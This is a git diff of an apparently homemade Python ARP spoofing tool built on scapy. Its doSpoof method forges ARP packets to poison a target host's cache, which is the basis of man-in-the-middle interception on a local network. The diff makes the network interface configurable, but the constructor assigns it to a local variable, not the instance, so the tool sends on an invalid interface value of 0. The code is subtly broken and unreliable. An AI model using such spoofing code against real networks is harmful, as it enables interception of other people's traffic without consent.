@@ -2,8 +2,10 @@ import sys
 from scapy.all import *
 
 class ArpSpoofing:
+    interface = 0
 
-    def __init__(self):
+    def __init__(self, intFace):
+        interface = intFace
         pass
 
     def doSpoof(self, hostToAttack, hostToSpoof):
@@ -30,7 +32,7 @@ class ArpSpoofing:
         packet = etherPart / arpPart
 
         #sends packet
-        sendp(packet, iface="enp0s3", verbose=False)
+        sendp(packet, iface=self.interface, verbose=False)
         print("Spoof Spoof")
 
 
